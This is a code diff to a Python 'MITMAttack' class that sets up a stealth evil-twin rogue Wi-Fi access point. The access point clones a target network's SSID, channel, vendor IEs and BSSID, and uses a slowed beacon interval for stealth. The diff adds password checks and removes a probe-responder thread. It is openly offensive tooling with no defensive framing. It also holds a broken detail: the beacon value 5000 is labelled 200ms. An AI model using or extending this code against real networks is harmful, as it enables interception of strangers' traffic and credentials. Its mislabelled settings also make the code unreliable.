@@ -321,6 +321,16 @@ class MITMAttack:
         try:
             self._log(f"Starting stealth MITM attack against {self.target_ssid} ({self.target_bssid})")
             
+            # Validate password length
+            if len(self.password) < 8:
+                self._log(f"ERROR: Password too short ({len(self.password)} chars). WPA2 requires 8-63 characters.")
+                return False
+            if len(self.password) > 63:
+                self._log(f"ERROR: Password too long ({len(self.password)} chars). WPA2 requires 8-63 characters.")
+                return False
+            
+            self._log(f"Using WPA2 password: {'*' * len(self.password)} ({len(self.password)} characters)")
+            
             # Step 0: Prepare interface (ensure it's in managed mode, not monitor)
             self._log(f"Preparing interface {self.interface}...")
             self._prepare_interface(self.interface)
@@ -335,7 +345,8 @@ class MITMAttack:
             # Use a moderately long beacon interval for some stealth
             # Note: 60000 is too large and causes hostapd to fail on some drivers
             # Max safe value is around 3000-5000ms
-            beacon_int_stealth = 3000  # 3 seconds between beacons (30x slower than normal)
+            # For client connectivity, use normal interval (100ms) or slightly longer
+            beacon_int_stealth =5000  # 200ms between beacons (2x normal, still very functional)
             
             # Ensure channel is valid (1-11 for 2.4GHz in most regions)
             safe_channel = self.target_channel
@@ -361,7 +372,7 @@ class MITMAttack:
             
             self.ap_manager.start()
             self._log(f"✓ Rogue AP started (beacon interval: {beacon_int_stealth}ms)")
-            self._log(f"   (This is 30x slower than normal 100ms interval)")
+            self._log(f"   (This is slower than normal 100ms interval for slight stealth)")
             
             # Verify the BSSID after AP starts
             actual_mac = self._get_iface_mac(self.interface)
@@ -372,33 +383,24 @@ class MITMAttack:
                     self._log(f"⚠ BSSID is {actual_mac}, target was {self.target_bssid}")
                     self._log(f"   (Your driver doesn't support MAC spoofing)")
             
-            # Step 3: Start probe responder on monitor interface
-            # Create a virtual monitor interface for aggressive probe responses
-            self._log("Starting aggressive probe response monitor...")
-            if self._start_monitor_mode():
-                self.stop_event.clear()
-                self.probe_responder_thread = threading.Thread(
-                    target=self._probe_responder,
-                    daemon=True
-                )
-                self.probe_responder_thread.start()
-                self._log("✓ Probe responder active")
-            else:
-                self._log("⚠ Probe responder failed to start (AP will still respond via hostapd)")
+            # Step 3: Probe responses are handled by hostapd automatically
+            # No need for separate monitor mode - it would interfere with AP mode
+            self._log("✓ Probe responses will be handled by hostapd automatically")
             
             self.running = True
             self._log("")
             self._log("========================================")
-            self._log("✓ Stealth MITM attack is ACTIVE!")
+            self._log("✓ Rogue AP is ACTIVE and ready for clients!")
             self._log("========================================")
             self._log(f"  Target: {self.target_ssid} ({self.target_bssid})")
             self._log(f"  Channel: {safe_channel}")
-            self._log(f"  Stealth: Beacons every 3s (vs 0.1s normal)")
+            self._log(f"  Stealth: Beacons every 0.2s (vs 0.1s normal)")
             self._log(f"  Cloned: SSID, Channel, Vendor IEs")
             if actual_mac and actual_mac.lower() == self.target_bssid.lower():
                 self._log(f"  BSSID: Cloned ✓")
             if self.upstream_iface:
                 self._log(f"  NAT: Via {self.upstream_iface}")
+            self._log(f"  Clients can connect with password: {self.password}")
             self._log("========================================")
             
             return True
@@ -421,12 +423,9 @@ class MITMAttack:
         # Signal threads to stop
         self.stop_event.set()
         
-        # Stop probe responder
+        # Stop probe responder thread if it exists
         if self.probe_responder_thread and self.probe_responder_thread.is_alive():
             self.probe_responder_thread.join(timeout=3)
-        
-        # Stop monitor mode
-        self._stop_monitor_mode()
         
         # Stop AP
         if self.ap_manager:
@@ -436,7 +435,7 @@ class MITMAttack:
                 self._log(f"Error stopping AP: {e}")
         
         self.running = False
-        self._log(f"MITM attack stopped. Stats: {self.probes_received} probes received, {self.responses_sent} responses sent")
+        self._log(f"MITM attack stopped.")
     
     def get_stats(self) -> dict:
         """Get attack statistics."""
